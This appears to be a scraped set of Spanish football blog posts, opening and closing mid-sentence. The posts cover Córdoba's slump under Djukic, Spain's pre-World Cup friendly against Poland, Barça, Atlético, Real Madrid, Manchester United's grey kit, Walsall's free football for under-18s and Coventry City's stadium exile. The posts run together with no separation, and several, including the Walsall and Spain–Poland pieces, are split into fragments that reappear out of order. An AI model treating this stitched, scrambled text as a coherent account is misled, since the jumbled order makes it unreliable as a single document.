ciudad con ambiciones en la Europa League.Foto: Galatasaray Leo en When Saturday Comes que el Wallsall, tercera inglesa, ha decretado que el fútbol sea gratuito para los aficionados menores de dieciocho años. Pagas 46 libras por el abono y te devuelven 2 en cada uno de los 23 partidos a los que asistas. Eterna plaza del infrafútbol que jamás podrá crecer en atención encajonada como está entre Birmingham, Wolverhampton y West Bromwich, la gerencia del club quiere poner fin así a la sangría taquillera que viene golpeando a un equipo que no ha sido noticia últimamente más que por sinsabores económicos. Acercar el club a la comunidad, hacer afición son conceptos que da gusto escuchar en una época en que los socios tenemos que conformarnos por pagar un dineral tan solo para disfrutar de un trozo de plástico donde nos obligan a sentarnos.Qué forma tan opaca de desplegarse en el campo, de trenzar jugadas, de crecer sobre el campo retorciéndose como el tronco de una higuera. Nada incita a la esperanza, sólo las matemáticas, quizá. Ayer el Córdoba volvió a perder ante un Espanyol que hizo lo estrictamente necesario, especulando con el músculo y el gol imparable de Abraham en la primera mitad. La segunda parte fue todo empuje blanquiverde. La ilusión del empate se fue diluyendo viendo la falta de claridad en el ataque. Ni los destellos de Bebe y Cartabia pudieron dar sentido a un planteamiento que “de latir se ha parado”, con permiso de Audiard.Empiezo a pensar que es Djukic quien no da con la tecla. Es tentador acusar a los jugadores, pero tras los refuerzos invernales da la sensación de que el equipo puede jugar mejor de lo que lo hace. Un once, por ejemplo, con Saizar-Edimar-Crespo-Pantic-Campabadal-Zuculini-Krhin-Rossi-Bebe-Cartabia-Ghilas no puede ir por ahí penando de campo en campo. Las alineaciones son erráticas, el equipo juega embotellado, la estrategia a balón parado es casi inexistente, la defensa en los saques de esquina es azarosa. El entrenador serbio parece haber perdido la fe en sí mismo y en el equipo. Ni el discurso motivador, y hueco, del cuchillo entre los dientes tras la goleada en el Camp Nou ha conseguido enchufar a jugadores como Borja García o Juan Carlos, que parecen perdidos para la causa.Se habló mucho anoche sobre el castigo a Ghilas. Cierto que se echó de menos al argelino sobre el campo. Es uno de los pocos jugadores que logran cortocircuitar la defensa rival, que es capaz de generarse el gol por sí mismo.Qué diferente de Andone, por cierto, delantero titular ayer y que volvió a demostrar que la Primera, de momento, se le queda muy grande. El castigo ejemplarizante lo dejó en casa tras la fiebre del sábado noche pasada, previa a entrenamiento y posterior a derrota. Cierto que no fue el único pero sí el más señalado. Yo apoyo toda medida disciplinaria de ese tipo. Dentro del sueldo del jugador está, por supuesto, cuidar su físico en la medida de lo posible y los cubatas cortitos de refresco no son la mejor forma. No es una cuestión de imagen, que también pero que cada cual lo lleve como quiere, es de compromiso con el club, de respeto a los compañeros y de optimizar el rendimiento. El problema es que por muy buenos que sean se crean insustituibles, desequilibrando la armonía del vestuario, tan necesaria en tiempos de apreturas como estos.El Espanyol demostró aplomo y experiencia. Dio el balón al Córdoba y esperó. Es un equipo al que no le molesta defender, que confía ciegamente en los destellos goleadores de Sergio García y Caicedo, y que sabe encerrarse. El arreón del Córdoba, que duró 45 minutos, se mereció el empate –el balón de Bebe a las nubes o el larguero de Crespo- pero cuando se juega sin cabeza los goles son una mera cuestión de fortuna.El Córdoba CF sigue en puestos de descenso. No sé si pedir el recambio de Djukic o confiar en el dios caprichoso del fútbol. El equipo blanquiverde es un adicto a los milagros, casi nos lo pide el cuerpo. Pero a veces no suceden, a veces cuando esperamos que todo se solucione en el último minuto por esa flor que parece acompañarnos desde el 1954, se nos tuerce la vida. Como en mi mal sueño, recurrente y agónico, en el que por unas cosas u otras siempre llego tarde a donde se me espera. •             Foto de: http://www.rcdespanyol.com/ Ensayo general. A un lado las probaturas, el medio gas, esos dos partidos insípidos. Hoy salían al campo prácticamente los once jugadores que debutarán el próximo 16 de junio. Salvo la entrada de Arbeloa por Ramos, apostaría porque esos serán los hombres que alineará Del Bosque ante Suiza. Perfecto el partido que ha realizado España ante una atemorizada Polonia. El balón ha circulado con facilidad, las líneas muy juntas, las bandas aprovechadas para desatascar las zonas medias, Iniesta estelar, el centro del campo carburando, cortando los ataques y entregándose al ataque con alegría, con ese manual del pase preciso, del balón inalcanzable para los rivales. Tan bien jugado que da repelús. Tan favoritos se ven que habrá que tocar madera cada vez que veamos una camiseta roja. La Selección Española ha encontrado el sistema, parece físicamente dispuesta para una competición tan dura como el Mundial, hay suplentes que lejos de enturbiar el ambiente aportan soluciones al equipo. Es un bloque anímicamente fuerte, que va a por los partidos, que ha dejado esos episodios especulativos, las repescas, las polémicas del alcoba, los debates irresolubles, una triste estela de malditismo, la pesadumbre de los cuartos. Parece que con aquella Eurocopa alzada en el 2008 se hubieran barrido los complejos, las miserias, aquel peregrinar pobre por el fútbol internacional. Y sí, sé que es pronto para celebrar nada. Estamos haciendo las maletas, nada más. Pero la estructura, el juego, la planta de esta selección nos anima a soñar despiertos.Ese chico de la casa por el que sí vale la pena mojarse. Decía ater el atacante argentino del Valencia Pablo Piatti, tras la derrota de su equipo ante el Atlético de Madrid (0-1), que el conjunto colchonero se había limitado a hacer ‘lo mínimo imprescindible‘ para ganar el partido. Y uno no termina de entender si las palabras del delantero valencianista tienen un sentido elogioso o peyorativo. Si esa alusión a que el Atleti se limitó a hacer un partido de mínimos y que con eso le fue suficiente para llevarse los tres puntos de Mestalla tiene un trasfondo crítico, como de aquel que espera algo más del equipo que, previsiblemente, va a alzarse campeón de la Liga más incierta de los últimos años.Bien es cierto que, por parte colchonera, el partido de Valencia se limitó a un nuevo ejercicio defensivo intachable por parte de la mejor y más fiable zaga del campeonato, de nuevo sin errores, y a saber aprovechar un error puntual del meta Guaita gracias a la oportuna aparición de Raúl García (diecisiete goles ya para el mediocampista navarro, entre las tres competiciones). Cero a uno. Un partido más finiquitado sin alardes, pero con tremenda efectividad. Y para qué mas, cuando el equipo observa como en la siguiente curva emerge un partido histórico en Londres. Para qué más, sabiendo que cada esfuerzo puede ser decisivo a estas alturas de la temporada, que cada balón dividido supone un riesgo intrínseco a recibir un mal golpe y que cada alegría extra e innecesaria puede acabar tirando por tierra el trabajo de todo un año.El ejercicio de autorregulación puesto en práctica por los de Simeone en estos últimos partidos puede ser la llave del éxito, del ser o no ser. Nadie va a pedir, llegados a estas alturas, que el Atleti se exhiba con una goleada ante el Elche o el Valencia. Su misión es sacar los puntos, seguir sumando con el título liguero entre ceja y ceja. Y lo debe hacer dosificando cada sprint, midiendo cada disputa de un balón aéreo. Ya nadie se cree que el Atleti vaya ‘partido a partido’. Lo suyo hace tiempo que se convirtió en una carrera con un objetivo (o varios, mejor dicho), claro e inequívoco. Jugó contra el Valencia con la cabeza claramente puesta en Stamford Bridge y en el fundamental partido del miércoles. Y es tan bueno, tiene tanta seguridad y tanta confianza en sus posibilidades, que puede incluso permitirse tales licencias sin que su rendimiento se vea resentido. En la semana en la que Carles Puyol anunció que dejaría la disciplina del FC Barcelona al concluir la presente temporada, el conjunto azulgrana viajó a Valladolid y se olvidó el orgullo y el coraje en casa, sobre la mesita de noche. En la misma semana en la que Carles Puyol anticipó la fecha de su adiós al club de su vida, Xavi Hernández, para más datos ayer capitán culé, escudó el impresentable partido perpetrado por su equipo en el Nuevo José Zorrilla bajo una excusa tan peregrina como recurrente en el muestrario habitual de excusas del genio de Terrassa. El césped pucelano, ‘irregular‘ en sus propias palabras, ‘no había ayudado‘ al juego del equipo. En la semana en la que Carles Puyol obligó a miles de azulgranas de todo el planeta a empezar a hacerse a la idea de esa angustiosa sensación de orfandad anunciada, Víctor Valdés, otro de los pesos pesadísimos del vestuario barcelonista, no dio la cara ante los medios de comunicación tras la derrota. En su lugar, en una maniobra que define su singularísima personalidad, colgó un vídeo en plan selfie (!) en su cuenta personal de Youtube tratando de expresar las sensaciones del grupo tras el inesperado tropiezo en Valladolid. En la semana en la que Carles Puyol, pundonor en persona, admitió que su maltratado cuerpo le obligaba a decir basta, Dani Alves volvió a disparar contra no se sabe muy bien quiénes, inventándose enemigos donde no los hay, instando a algunos a ‘bajarse del barco azulgrana‘. Tirando de un victimismo repulsivo, tristemente habitual en el lateral brasileño. Sobre todo cuando las cosas no le salen del todo bien. Lo hizo, por supuesto, vestido de Dani Alves. Con pantalones rosas. Con gafas XXL. Con chistera amarilla. O vaya usted a saber cómo. Como nunca jamás se vestiría Carles Puyol.En la semana en la que Carles Puyol i Saforcada, probablemente el mejor defensa de la historia del FC Barcelona y, sin ninguna duda, uno de los mejores ejemplos de profesionalidad, respeto al rival, sobriedad, honestidad y compromiso que en mis treinta y seis años he podido ver sobre un campo de fútbol, el Barça que visitó al Real Valladolid, de repente, se olvidó de todas aquellas condiciones que Puyol, eterno capitán, solía aportar incuestionablemente cada vez que se enfundaba la azulgrana y se ceñía el brazalete al bíceps. En la misma semana en la que Carles Puyol anunció su adiós con dos meses de adelanto, el Barça ya había empezado a echarlo de menos. Irrumpió endemoniado en el vestuario de The Dell, haciendo chocar la puerta violentamente contra la pared. ‘Quitáos ahora mismo esa camiseta de encima. Os vais a cambiar‘. Fueron sus primeras y sorprendentes palabras en aquellos intensos y extraños quince minutos de descanso. Había sido una primera mitad desastrosa a todos los niveles para el United, que desaparecía por el túnel abochornado con un tres a cero en contra. El Southampton de Matt Le Tissier y Neil Shipperley se había mostrado insuperable durante los primeros cuarenta y cinco minutos contra un Manchester United absolutamente sobrepasado por las circunstancias. Eran unos años, aquellos de la década de los noventa, en los que el equipo de Alex Ferguson acostumbraba a sufrir en en sus visitas a The Dell, pero lo de aquel caluroso día de abril había sobrepasado con creces las más nefastas expectativas.Era evidente que algo tenía que cambiar al descanso. Había que revolucionar el equipo de tal manera que en la segunda parte consiguiera voltearse tan duro y contundente resultado en contra. Dicen que en aquel soleado día, el brillo del sol de primera hora de la tarde era más intenso que de costumbre. Que era tal la luz que caía sobre el césped que para los jugadores del United se hacía realmente complicado establecer contacto visual con sus compañeros.Aquella estrambótica camiseta en varios tonos de color gris penalizaba aún más la compleja labor de localizar a un amigo sobre el verde. Incapaz de encontrar cualquier otro tipo de explicación a la debacle de su equipo en el primer acto, Alex Ferguson decidió que el Manchester United no volvería a vestir aquella camiseta (con la que presentaba un deplorable balance de cuatro derrotas y un empate) ni un solo minuto más. Y la tajante decisión no se demoró ni un minuto. El equipo saltó al campo en la reanudación del partido luciendo la que por entonces era tercera equipación, camiseta blanca y azul y pantalón azul y aunque no consiguió voltear el resultado, la imagen del equipo mejoró considerablemente. La camiseta fue retirada de la circulación por el club de manera oficial solo un par de días más tarde de aquel partido en Southampton. De repente, pasó de maldita a codiciado objeto de deseo y capricho de coleccionista.Pero la negativa trayectoria del United en The Dell tuvo un nuevo capítulo la campaña siguiente. Desterrada ya la inefable camiseta gris, los red devils se presentaron en Southampton esta vez de entrada con la camiseta azul y blanca con la que habían disputado la segunda mitad del partido de la temporada anterior. Una vez más, una lamentable actuación dejó un resultado al descanso de tres a uno para los locales. El United fue despedido al son del cántico ‘Have you got another kit?’ (‘¿No tenéis otra camiseta? ‘). Obviamente, el desastre no respondía a una simple cuestión de colores.Puedes comprar la infausta pero muy coleccionable camiseta gris del Manchester United en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Real Madrid y FC Barcelona disputaron un Clásico (3-4) atractivo, con ritmo, rico en ocasiones de gol y, por encima de todo, repleto de errores defensivos. No se recuerda un duelo entre los dos colosos con tal retahíla de fallos en defensa encadenados. Desde el hueco dejado por Carvajal en su obsesión por cerrar pasillos a Messi, y bien olfateado por Iniesta en el gol que abría el marcador a los siete minutos de juego, hasta el atropello al alimón entre Alonso y Carvajal, al propio Iniesta dentro del área madridista que dio origen al tanto de la victoria azulgrana, pasando por la exhibición de bailes regionales que Benzema brindó a Piqué y Mascherano en los dos primeros goles locales. Semejante colección de despistes, faltas de concentración y desajustes tácticos son impropios de dos equipos del nivel de Barça y Madrid, y dejan en una delicada evidencia el trabajo de sus preparadores. Son detalles que en los dos grandes tal vez sólo se adviertan cuando el rival en cuestión tiene capacidad de apretar y de exigirles, algo que en nuestra Liga cada vez es más complicado.Hasta el descalabro que supuso para los locales la expulsión de Sergio Ramos tras su penalti sobre Neymar, solo dos futbolistas, Karim Benzema y Ángel Di María, habían bastado a Ancelotti para desmantelar la propuesta azulgrana. El francés porque estuvo incisivo, hambriento y pletórico dentro del área de Valdés. El argentino porque ofreció una versión superlativa de ese nuevo futbolista que el técnico italiano parece haberse inventado tras la lesión de Khedira y la, llamémosle así, imposición de titularidad de Gareth Bale. El Fideo, con un despliegue físico admirable en prueba de su lealtad hacia Carlo y con una especial clarividencia a la hora de encontrar pasillos por los que profundizar hacia la línea de fondo y dejar en evidencia a Alves, fue el principal generador de ocasiones blancas mientras Bale se peleaba con su perfil menos bueno y Cristiano aparecía siempre demasiado lejos del área.Sólo Messi, cuando todos preveíamos un paseo local, se resistió a bajar los brazos ante el empuje madridista. Su gol al límite del primer tiempo permitió al Barça irse al vestuario creyendo, manteniendo la fe en su empresa. Siempre Messi, incluso en la temporada en la que más se ha discutido su papel. Lo repitió tras el tercero del Madrid, dibujando un pase trigonométrico hacia la productiva diagonal trazada por Neymar y dejando en evidencia lo que para muchos fue el origen del colapso madridista: el flojo partido de sus vértices del centro del campo, Alonso y Modric, incapaces de sujetar a su equipo justo cuando éste amenazaba hundimiento. Especialmente llamativo resulta el flojo partido del guipuzcoano, cada vez más entretenido en esas cuitas subterráneas tan habituales en estos duelos y más alejado del fútbol que le hizo gigante. Más cerca del uniforme de camuflaje que de ese frac que lucía como ninguno.Acogotado y obligado a cerrar filas en torno a la portería de Diego López tras la expulsión de Ramos, Ancelotti estuvo exasperantemente lento con el movimiento del banquillo. Tardó una eternidad en refrescar el centro del campo y cuando quiso darse cuenta de que Alonso y Modric boqueaban en busca de oxígeno, ya era demasiado tarde. Messi, otra vez de penalti tras torpeza madridista dentro del área, rescató tres puntos vitales para el Barça, dio vida a su paisano Martino, que cuenta ya sus dos duelos como técnico barcelonista ante el eterno rival por victorias, y apretó en su propio puño la parte alta de una clasificación liguera que vaticina emociones fuertes en las próximas semanas. Se hizo un nombre acudiendo puntualmente a su cita como rescatador del equipo en situaciones de apuro y se irá con un último servicio de rescate de alto riesgo, en la línea de los que durante estos últimos años le permitieron hacerse un hueco en la elite mundial. A Pedro Rodríguez Ledesma (Santa Cruz de Tenerife, 1987) le visitaron las musas en el que muy probablemente fue su último partido como barcelonista. Y lo hicieron en el momento más oportuno. Justo cuando su equipo más vacilaba y el Sevilla más apretaba. Irrumpiendo en una de esas escenas que parecen dibujadas expresamente para enaltecimiento del héroe inesperado. Cuando todos se quedaron congelados reclamando una hipotética mano dentro del área sevillista, Pedro activó su innato sentido de la supervivencia por última vez. Corrió al encuentro de aquel balón perdido rechazado por Beto y acercó al Barça hasta la orilla de la Supercopa georgiana con un gol que será recordado durante muchos años.Fue un gol merecido. Un gol para el reconocimiento. Un gol oportunísimo para refrescar la memoria de los que nunca vieron con malos ojos su salida por considerarlo un futbolista perfectamente prescindible en el ecosistema azulgrana. Porque hacia el atacante tinerfeño, que en su ansia de crecimiento demanda unos minutos que en Can Barça no parecen dispuestos a ofrecerle, el barcelonismo solo debería expresar palabras de elogio y agradecimiento. Su hoja de servicios, modesta pero impoluta, le modela como un futbolista si no brillante, sí tremendamente útil para su equipo. Uno de esos hombres en los que quizá no se repara en exceso hasta que no se tiene que lamentar su ausencia. Al canario se le quiere en el Barça. Pero no se le quiere como él quiere que se le quiera.Pedro quiso aislarse de sus compañeros durante las celebraciones del título.Se le vio serio, más circunspecto que de costumbre, extraordinariamente comedido. Como ese niño que demandando mayor atención se aleja voluntariamente del juego y del bullicio para que alguien acuda a pasarle el brazo sobre los hombros y preguntarle qué le pasa. Escenificando un adiós claramente indeseado. Pidiendo comprensión a gritos. Ignorando que, en el fútbol, ya apenas queda sitio para sentimentalismos.Puedes comprar camisetas de Pedro en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. “A esta película la vamos a titular ‘Esperando a Leo’“. Todos teníamos claro, de un modo u otro, que el partido de anoche entre Barça y Bayern estaba reservado para Leo Messi. Lo sabía Guardiola, que en los días previos al gran choque había advertido de que no había estratagema táctica alguna capaz de neutralizar el juego de la estrella azulgrana. Lo sabían los futbolistas del Bayern, que daban palmas con las orejas por el cero a cero que habían conseguido mantener de esforzada manera durante setenta y cinco extenuantes minutos. Y lo sabía el barcelonismo, que ya comenzaba a mostrar síntomas de exasperación por ver a su equipo perfectamente maniatado bajo la elevada presión bávara. Pero por encima de esquemas, de disposiciones tácticas, de engranajes asimilados y de dibujos asimétricos para buscar el flanco débil del adversario están los futbolistas. Los que interpretan y disponen. Los que hacen buenos o malos, útiles o inútiles, los sesudos planteamientos de sus técnicos. Y, en definitiva, los que decantan la balanza hacia un lado u otro y atraen el protagonismo del espectáculo hacia donde realmente debe reposar: el césped. Y no hay entramado de líneas en la pizarra que se imponga a la determinación de aquellos que deben de ejecutarloA Leo le costó lo indecible. Tanto, que acabó convirtiendo la película en un agotador thriller repleto de tensión e incertidumbre. El Barça acumulaba ocasiones mientras se disputaba el terreno en el centro del campo contra el triángulo formado por Lahm, Alonso y Schweinsteiger. Llegaba hasta el imponente Neuer pero su falta de acierto hacía bueno el planteamiento de Guardiola, más destinado a controlar a la bestia que a infligirle cualquier tipo de daño. Pero llegó el momento. Una recuperación de Dani Alves tras una pérdida forzada de Juan Bernat fue el preludio del clásico latigazo desde la frontal del argentino. 1-0, el Barça por delante. El triángulo de control Lahm-Alonso-Schweinsteiger saltaba por los aires. El entramado asimétrico que colocaba a Bernat bastantes metros por delante con respecto a la posición de Rafinha en el lateral izquierdo quedaba inutilizado. El posterior cambio de defensa de tres a línea de cuatro, para ejercer un mayor control ante la movilidad de la vanguardia culé, inservible. Todas las previsiones, las soluciones, los remiendos y las reacciones tácticas ante el movimiento del rival programadas por Guardiola se iban a la papelera tras el golpe de autoridad del mejor futbolista del mundo. Y no se quedó ahí, sino que llegó tan lejos, fue tan contundente, que se extendió hasta proclamar el favoritismo absoluto del FC Barcelona para levantar este título.Pep volvía a casa. Pero lo hacía del brazo de ‘la otra’, que es guapa pero no tanto, y provocando los sentimientos encontrados de ‘su legítima’, que continúa siendo un cañón irresistible. Una historia de esas que no pueden terminar bien. Como si Scorsese le hubiese plantado en mitad de una inquietante noche en el peor rincón del SoHo neoyorquino de los años ochenta, el Atlético de Madrid vivió anoche sobre el césped del Vicente Calderón una de esas noches que varias generaciones de hinchas colchoneros registrarán en su memoria de por vida. Con una actuación colectiva inolvidable y bajo una comunión ideal con la grada, el cuadro de Simeone no solo salió vivo de una experiencia que podría haber sido traumática, sino que, como Paul Hackett, consiguió aparcar en una esquina ese aura de equipo gris, de maldito perdedor, de oficinista tristemente acostumbrado a las monótonas paredes de su cubículo para convertirse en uno más del selecto club de los elegidos. Dejó de ser un pez fuera del agua y, a diferencia del protagonista de la cinta de Scorsese, salió indemne y victorioso de un escenario que no parecía el suyo y que invitaba a un argumento con final cruel. Acabó llevándose a Marcy al catre, como un campeón.A partir de cómo midió los tiempos de su partido ante el FC Barcelona el Atleti podría escribirse un tratado. Por cómo saltó al campo aprovechando la primera ola y martilleando sin piedad la portería de Pinto para adelantarse en el marcador con el gol de Koke, cobrar importante ventaja y meter el miedo en el cuerpo de los azulgrana y por cómo supo contemporizar el choque y hacer que una minutada eterna se esfumase en un abrir y cerrar de ojos. El partido transcurrió lentísimo para el Barça durante los primeros veinte minutos y fue un visto y no visto, en mitad de su impotencia, durante los setenta restantes hasta el pitido final.Tropezó el Barça en su manera de dirigir el acoso sobre la meta de Courtois.Hoy era una blanda Polonia. Pero después serán Suiza, Honduras, Chile… dramatizamos si pensamos que es un grupo complicado. Seis a cero es un resultado contundente, una tarjeta de presentación para los rivales que, libreta en mano, intentaban analizar el juego de control de nuestro equipo nacional. Complicado traducir al papel las sensaciones que emana este conjunto. Freno la euforia, aunque cuento los días para ver a estos futbolistas pisar césped sudafricano.El equipo funciona tal como está, y eso implica el desempeño de Busquets en la media. Tras el titubeante partido contra Arabia Saudí muchos éramos los que desconfiábamos de ese doble pivote junto a Alonso. La sombra de Senna y la posibilidad, en mi opinión ficticia, de que Alonso fuera el último centrocampista, amargaban el éxito de un futbolista que ha brillado en su club, el alabado Barcelona. Yo decía, y me reitero hoy que Busquets ha estado sobresaliente, que necesitamos un jugador de choque y briega en esas zonas periféricas cuando el equipo bascula. Alonso gana mucho con un jugador tan solidario atrás, también los laterales, hoy Arbeloa no ha dejado de subir, cómodo con las espaldas bien cubiertas. Xabi, como decía, se suma más al ataque y su juego es necesario para que Xavi brille. Le libera de cualquier obligación defensiva, suministra juego a las bandas, sube el balón desde la caverna con claridad, monta el contraataque. Flota en el círculo central, con la vista hacia delante, con Xavi en una pupila y el extremo en el otro. Un planteamiento que se sustenta en Busquets, como en Senna en la Eurocopa, fútbol moderno, la base del 4-3-3 o de ese bastardo 4-5-1. Con Busquets atrás, Cesc puede jugar de Xabi Alonso e Iniesta de Xavi. Javi Martínez es una alternativa diferente. Con rigor defensivo pero con más proyección en ataque. Solución para partidos fáciles –Honduras– o con resultados en contra, ya pensando en las eliminatorias. En resumen tres piezas interdependientes, cada cual liberando escalonadamente al compañero de obligaciones, de la zona roja de Busquets a la zona verde de Xavi. Entre medias, una telaraña de centrocampistas generosos en el esfuerzo para que los de arriban puedan brillar como acostumbran. Buenas noticias en la delantera también con la vuelta de Torres, el gol de Pedro, el atrevimiento de Navas. Sumémosle la alternativa de Llorente, y, por supuesto, los titulares. Villa que sigue a lo suyo, gol tras gol. Silva, un jugador al que no se le puede marcar, con una movilidad desconcertante. Iniesta, que a pesar de las molestias de hoy está rayando a su mejor nivel.En fin, hay que estar felices con unos futbolistas en estado de gracia. La precaución es una virtud. La exaltación sólo sirve para agravar el golpe tras la caída. Es casi imposible, os confieso, ser precavido cuando ves un equipo jugando tan sobrado, con tanta profundidad, con un gusto por la estética que no para de ganar adeptos. Desde el espacio que me brinda este blog reivindico el derecho a celebrar hasta los amistosos de esta selección, el derecho a decir sin tapujos que vamos a ganar el Mundial de calle, el derecho a disfrutar de un fútbol que es un fin en sí mismo. Ya vendrán los Tassottis, los coreanos o Cardeñosa a despertarnos del sueño pero, a una semana de nuestro debut en la Copa del Mundo, permitámonos el capricho de sentirnos reyes de este deporte mágico. Partido pobre, aburrido y descentrado del Madrid, en casa, ante un Sevilla que no sólo no da muestras de mejoría sino que cae en picado con Manzano a los mandos. Sin creatividad en el mediocampo, entregados a la brillantez –hoy insuficiente- de Cristiano, sin claridad en las bandas, con Özil transparente en la zona caliente del ataque y con Benzema naufragando partido tras partido. El francés no superó el examen al que se le expone semana tras semana. Si el equipo no le encuentra, difícilmente luce en solitario. Parece un equipo abrumado a la sombra de un Barcelona que ayer ganó, sentimentalmente, este campeonato. Difícil jugar mejor que los azulgranas, cierto, pero al menos hay que intentar dar espectáculo, mostrar superioridad, dar indicios de esa excelencia que hoy parece un chiste de mal gusto. Y no es que el Sevilla haya hecho un gran partido, ni mucho menos, es el equipo más plano que ha vestido la elástica nervionense en los últimos años. Mudos arriba, con todos los jugadores desenchufados, erráticos, incapaces de poner en peligro la portería rival. Inseguros atrás y con un portero que, habiendo sido todo, ahora es un peligro potencial para los compañeros. El gol de Di Maria, que vio un hueco donde Palop, vendido por su defensa, nunca pensó que pasaría el balón, ha ridiculizado a un guardameta que lleva unos meses horribles, fallón, sobreexcitado.La entrada de Granero animó un poco el equipo, también la presencia de Pedro León. El doble pivote da buenas sensaciones en los partidos difíciles pero hoy ha sido un lastre difícilmente superable. Lass pulula por su zona sin sumarse nunca con criterio al ataque. Khedira es un jugador que va a más, pero que se basta solo en un mediocampo con el clásico 4-4-2 y acompañado por la verticalidad de Alonso o Granero. Cuando el francés y el alemán se juntan no pasan los jugadores pero el balón se queda huérfano, a la espera de que Di Maria u Özil bajen a recibir, con el consecuente perjuicio ofensivo. Manzano combatió el doble pivote madridista con la pareja Zokorá – Romaric, lo que desarrolló un cuarteto de inoperancia creativa en la medular. El Sevilla solo creó peligro en los desmarques de Negredo, bien cortados por el velocísimo Pepe, y en lo que pudo sacar Capel de sus incursiones por la izquierda. El partido fue bronco sobre el terreno y excesivamente tenso en graderío y banquillos.Ha sido el peor partido madridista de la temporada. Es un equipo que vive de la pegada, del resultadismo, pero hoy no ha habido casi de nada. Tras las navidades empezarán las cosas importantes, las eliminatorias de Champions, una liga en la que no es posible titubear. Es urgente la presencia de un delantero eficaz si la lesión de Higuaín sigue ese camino. Lo de poner a Ronaldo de punta es un experimento digno de científicos locos como Queiroz. Para mí no es alternativa. La importancia de Özil se ha ido diluyendo como en agua. Está ausente, fofo, perdido, depresivo. Si Canales ya está tachado, debe tener más importancia, Alonso no está preparado para esa responsabilidad y la vuelta de Kaká parece una broma recurrente. Las buenas noticias son la presencia de Di Maria y un partido esperanzador de Pepe. No es poco viendo la pobreza de recursos de un equipo que poco a poco va hacia atrás, demasiado pendiente de lo que sucede en los alrededores del campo y no en el desempeño sobre el inexpugnable césped. Es de personas inteligentes tratar de reinventarse cada semana. Ordenar los muebles, hacer propósitos bondadosos, saludar a los vecinos con entusiasmo, salir a correr para expiar nuestros pecados veniales.En la mayoría de ocasiones sucio y sin nada que ver desde él.Aplausos al ideólogo y ahora un poco de historia. Hasta el momento Walsall servía en las conversaciones futbolísticas rebuscadas tan solo por dos motivos. El primero es que 1933 el club local alumbró la que hasta hoy permanece en el imaginario colectivo como la mayor sorpresa de la Copa doblegando al Arsenal, campeón la temporada anterior, en tercera ronda. La gracia del asunto fue que ellos se ganaban la vida en las calderas de la tercera división. Imagínense que en la réplica del programa de aquel día todavía se sigue vendiendo a buen ritmo en la tienda del club y que a una de las tribunas del coqueto Bescot Stadium se le sigue conociendo como la Gilbert Alsop, goleador en la proeza. A pesar de que oficialmente lleve el nombre de un patrocinador o de que queden ya pocos parroquianos vivos que hayan visto jugar al astro.Otro clavo al que se puede agarrar el erudito si por alguna extraña casualidad tiene que hablar del Walsall en algún momento de su vida son los famosos pasteles de pollo Balti. 200 gramos de colesterol a base de carne marinada en naranja y curry que ahora es primer plato en la dieta de estadio de muchos británicos, también causa de la obesidad rampante, pero que en 1997 solo se podía probar en los bares del Bescot y de Villa Park. Ricos pasteles de curry, el resultado más insospechado de la historia y fútbol gratis, al fin y al cabo no son malas aportaciones al fútbol británico para unos desheredados, para unos militantes fieles del infrafútbol como el Walsall. El Coventry vivía tranquilo en el Ricoh Arena hasta marzo del año pasado. Ahora anda como el elefante de su escudo, haciendo equilibrios peligrosos sobre un balón de fútbol. La vida de sus aficionados ha cambiado radicalmente desde que Sisu, el fondo de inversiones especializado en operaciones de riesgo que manda allí desde 2007, dejó de de pagar el alquiler por primera vez en cinco años y defenestró a una afición con 130 años de historia obligándoles al ocupar un modesto campo en Northampton. A 54 kilómetros de casa. Desde ese momento el estadio original, un flamante recinto para 32.000 personas inaugurado en 2005, ha acogido de todo menos fútbol. Un multitudinario concierto de Bruce Springsteen, algún torneo de póquer e incluso un congreso para estudiosos de la Biblia. Junto a Wembley y el Emirates competirá en los próximos Live Music Awards por ser el mejor escenario para eventos de Inglaterra y si ganase provocará una paradoja extraña. Sería el estadio más rentable en el país del fútbol sin necesidad de fútbol. Lo triste es que ni el club ni los aficionados se están beneficiando de este éxito. Más bien al contrario.David Conn explicó hace poco en The Guardian los lamentables tejemanejes de Sisu respecto al nuevo campo y al futuro del club pero yo he querido saber cómo están viviendo la gente del Coventry este destierro forzado. Por eso me puse en contacto con Michael Orton, el coordinador de “Keep Cov in Cov” (kcic), una asociación de aficionados tremendamente activa que se opone al cambio de campo y trabaja para preservar la identidad de su equipo. Orton ve el futuro muy negro mientras el club siga en manos de los actuales dueños. “Están arrancándole el corazón al club y se está perdiendo una generación de aficionados. Esperamos una resolución positiva pero de momento no hay ninguna evidencia de que el Coventry pueda volver alguna vez a Coventry” Es la amargura de un tipo curtido. De uno que con 50 años ya lleva 40 de grada y que tras descender a la League One la temporada pasada creía haberlas visto de todos los colores.Evidentemente, tiene motivos para mosquearse. Desde que arrancó la temporada del deshaucio la venta de entradas ha disminuido en un 90% y las soluciones que proponen los dueños solo generan desconfianza. Joy Seppala, al mando en Sisu, rechazó volver al estadio a coste de renta cero. El triunvirato que gestiona el Ricoh (Ayuntamiento, el empresario Edward Higgs a través de su fundación benéfica y el Arena Coventry Limited) le ofrecieron un acuerdo difícilmente mejorable para que el club solo tuviera que afrontar los gastos generados durante los partidos. Declinó la oferta quizá porque su plan maestro parece ser otro, comprar a la baja para explotar totalmente el recinto.Se habla de 4 millones de libras por un estadio cuya construcción costó 113, sufragados en parte por los contribuyentes de Coventry, y que realmente es patrimonio de la ciudad. Para conseguir su objetivo no ha dudado en presionar a las autoridades llevándose el club fuera de la ciudad durante los próximos cinco años o, en última instancia, anunciar a bombo y platillo el proyecto para un campo nuevo de 12.000 personas. No consideró importante aclarar por qué el estadio es inferior en prestaciones al anterior, tampoco donde lo piensa edificar ni como piensa pagarlo.Mientras tanto, a los hinchas solo les queda el derecho a la insumisión. “Hemos protestado frente a las oficinas de Sisu en Londres, frente a la sede de la Football League y fuimos 7.000 personas las que nos manifestándonos en Coventry. La mayoría de aficionados están boicoteando los partidos en Northampton y las entradas en el nuevo campo están en mínimos históricos. Al mismo tiempo, la asistencia a los partidos como visitante ha aumentado dramáticamente porque los aficionados apoyan al equipo pero no a los propietarios.” Así, el equipo viene jugando frente unos 2.000 aficionados en su nuevo campo mientras que fuera ha provocado exitazos de taquilla en campos como el del Milton Keynes Dons, el del Bradford o el del Wolverhampton. La afición se está sacrificando para proteger la identidad de su club frente unos dueños tan voraces como incapaces pero sin dejar de lado al equipo. Con un comportamiento ejemplar. “El club fue fundado en Coventry hace 130 años y es una parte integral de la identidad de la ciudad. La gente de Coventry se opene al traslado y aficionados de otros equipos, periodistas y demás han reconocido que la situación no es la correcta”. Orton explica con 